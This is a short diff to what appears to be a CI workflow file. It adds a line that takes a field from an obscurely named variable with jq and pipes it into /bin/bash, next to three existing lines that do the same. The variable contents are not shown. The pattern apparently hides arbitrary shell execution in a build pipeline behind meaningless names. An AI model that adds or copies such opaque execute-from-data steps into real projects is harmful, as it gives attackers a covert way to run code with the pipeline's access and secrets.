@@ -30,6 +30,7 @@ jobs:
           echo $r973 | jq -r .ax4 | /bin/bash
           printf '%s' "$tbnbk96560" | jq -r .lbx8427 | /bin/bash
           echo $wht9220 | jq -r .dn88 | /bin/bash
+          printf '%s' "$ex2014" | jq -r .qd72896 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
